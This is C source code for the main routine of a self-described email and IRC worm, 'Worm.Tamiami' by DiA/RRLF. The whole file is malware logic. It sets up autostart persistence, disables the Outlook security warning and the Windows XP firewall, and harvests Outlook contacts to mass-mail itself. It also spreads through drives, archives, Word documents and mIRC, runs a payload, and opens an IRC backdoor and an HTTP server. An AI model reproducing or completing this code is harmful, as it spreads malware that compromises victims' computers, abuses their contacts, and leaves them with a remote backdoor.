   #include "_Ver_Inc_Docu_.h"

   int APIENTRY WinMain(HINSTANCE T, HINSTANCE A, LPSTR M, int cmdShow)
   {
       char    Version[] = "Worm.Tamiami v1.3.2 by DiA/RRLF";
       char    AutostartMethod[MAX_PATH];
       char    AutostartApplication[MAX_PATH];
       char    WebsiteDirectory[MAX_PATH];
       char    MailDirectory[MAX_PATH];
       char    IPBuffer[100];
       char    WormPath[MAX_PATH];
       HANDLE  DoorHandle;

       char    WebsiteDirectoryName[] = "\\tamweb\\";
       char    SimpleAutostartName[] = "\\strangler.exe";
       char    MailDirectoryName[] = "\\tammail\\";

       OnlyOneInstance(Version);

       if(GetModuleFileName(0, WormPath, sizeof(WormPath)) != 0)
       {
           if(strstr(WormPath, SimpleAutostartName) != 0)
           {
               TakeCareOnMe(WormPath);
           }
       }

       if(WormInstalled() == false)
       {
           SimpleAutostart();
           lstrcpy(AutostartMethod, "Regular");

           if(GetWindowsDirectory(AutostartApplication, sizeof(AutostartApplication)) != 0)
           {
               lstrcat(AutostartApplication, SimpleAutostartName);
           }

           RegisterVersion(Version, AutostartApplication, AutostartMethod);

           if(GetWindowsDirectory(WebsiteDirectory, sizeof(WebsiteDirectory)) != 0)
           {
               lstrcat(WebsiteDirectory, WebsiteDirectoryName);

               if(CreateDirectory(WebsiteDirectory, 0) != 0)
               {
                   CreateWebsite(WebsiteDirectory, GetPictures(WebsiteDirectory, 3));
               }
           }
       }
       else
       {
           UpdateWorm(Version);
       }

       DisableMapiWarning();
       DisableXPFirewall();

       if(GetWindowsDirectory(MailDirectory, sizeof(MailDirectory)) != 0)
       {
           lstrcat(MailDirectory, MailDirectoryName);

           if(CreateDirectory(MailDirectory, 0) != 0)
           {
               if(GetOutlookContacts(MailDirectory) == true)
               {
                   if(MassMailUrl(MailDirectory) == false)
                   {
                       SimpleMassMail();
                   }
               }
           }
       }

       CreateThread(0, 0, DriveSpread, 0, 0, 0);
       CreateThread(0, 0, RarWorm, 0, 0, 0);
       CreateThread(0, 0, ZipWorm, 0, 0, 0);
       WordInfection();
       Payload();

       WaitForConnection();

       MircSpread();
       IrcThreads();

       DoorHandle = CreateThread(0, 0, IrcBackdoorRun, 0, 0, 0);

       if(GetWindowsDirectory(WebsiteDirectory, sizeof(WebsiteDirectory)) != 0)
       {
           lstrcat(WebsiteDirectory, WebsiteDirectoryName);

           if(GetIP(IPBuffer) == true)
           {
               while(HTTPServer(WebsiteDirectory) == false);

               TerminateIrcThreads(); //stop irc threads when http fucked up
           }
       }

       WaitForSingleObject(DoorHandle, INFINITE);

       return 0;
   }
